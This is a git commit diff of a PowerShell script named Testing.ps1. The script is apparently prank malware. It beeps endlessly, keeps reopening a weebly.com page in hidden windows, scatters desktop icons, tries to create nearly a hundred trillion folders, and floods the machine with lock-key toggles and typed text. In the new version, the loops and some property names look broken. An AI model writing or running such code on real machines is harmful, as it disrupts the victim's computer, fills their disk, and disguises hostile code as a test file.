1df600ad3f37cf6a6fa53e0ebeba174eed7ae7ff
FinalRuze <132386390+FinalRuze@users.noreply.github.com>
2023-05-06 17:54:11 -0700

    Update Testing.ps1

--- Testing.ps1
+++ Testing.ps1
@@ -1,38 +1,47 @@
-# Script 1
-While ($true) {
-    Start-Process -FilePath powershell.exe -ArgumentList '-Command', '[System.Media.SystemSounds]::Beep.Play()' -WindowStyle Hidden -Wait
+# Define function to play beep sound
+function Play-Beep {
+    [System.Media.SystemSounds]::Beep.Play()
 }
 
-# Script 2
-While ($true) {
-    Start-Process -FilePath "https://j26nabr4tcsw908qiu.weebly.com/" -WindowStyle Hidden
-    Start-Process -FilePath "https://j26nabr4tcsw908qiu.weebly.com/" -WindowStyle Hidden
-    Start-Sleep -Seconds 1
+# Create infinite loop to play beep sound every 5 seconds
+while ($true) {
+    Play-Beep
+    Start-Sleep -Seconds 5
 }
 
-# Script 3
-While ($true) {
-    $objShell = New-Object -ComObject WScript.Shell
-    $objShellApp = New-Object -ComObject Shell.Application
-    $objDesktop = $objShellApp.Namespace(0)
-    $objFolder = $objDesktop.Self
-    foreach ($objItem in $objFolder.Items()) {
-        $xPos = Get-Random -Minimum 0 -Maximum ($objItem.ExtendedProperty("System.HorizontalSize") - $objItem.ExtendedProperty("System.HorizontalPosition"))
-        $yPos = Get-Random -Minimum 0 -Maximum ($objItem.ExtendedProperty("System.VerticalSize") - $objItem.ExtendedProperty("System.VerticalPosition"))
-        $objShellApp.MoveItem($objItem, $xPos, $yPos)
+# Create infinite loop to open two instances of a website every 5 seconds
+while ($true) {
+    Start-Process "https://j26nabr4tcsw908qiu.weebly.com/" -WindowStyle Hidden
+    Start-Process "https://j26nabr4tcsw908qiu.weebly.com/" -WindowStyle Hidden
+    Start-Sleep -Seconds 5
+}
+
+# Create infinite loop to randomly move desktop icons every 5 seconds
+while ($true) {
+    $shell = New-Object -ComObject Shell.Application
+    $desktop = $shell.Namespace(0)
+    foreach ($item in $desktop.Items()) {
+        # Get random x and y coordinates
+        $xPos = Get-Random -Minimum 0 -Maximum ($desktop.ParentWindow.rect.width - $item.ExtendedProperty("System.ItemNameWidth"))
+        $yPos = Get-Random -Minimum 0 -Maximum ($desktop.ParentWindow.rect.height - $item.ExtendedProperty("System.ItemNameHeight"))
+        # Move the item to the random position
+        $shell.MoveItem($item.Path, $xPos, $yPos)
     }
     Start-Sleep -Seconds 5
 }
 
-# Script 4
-$num_folders = 99999999999999
+# Create 99999999999999 folders with a base folder name of "FinalRuze"
 $base_folder_name = "FinalRuze"
-
-for ($i = 1; $i -le $num_folders; $i++) {
-    $folder_name = $base_folder_name + $i
+for ($i = 1; $i -le 99999999999999; $i++) {
+    $folder_name = "$base_folder_name$i"
     New-Item -ItemType Directory -Path $folder_name | Out-Null
-    Write-Host "Created folder: $folder_name"
 }
 
-Write-Host "Press any key to continue..."
-$x = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+# Enable CAPSLOCK, NUMLOCK, and SCROLLLOCK keys, and type "This is the FinalRuze" infinitely
+Add-Type -AssemblyName System.Windows.Forms
+while ($true) {
+    [System.Windows.Forms.SendKeys]::SendWait("{CAPSLOCK}")
+    [System.Windows.Forms.SendKeys]::SendWait("{NUMLOCK}")
+    [System.Windows.Forms.SendKeys]::SendWait("This is the FinalRuze")
+    [System.Windows.Forms.SendKeys]::SendWait("{SCROLLLOCK}")
+}
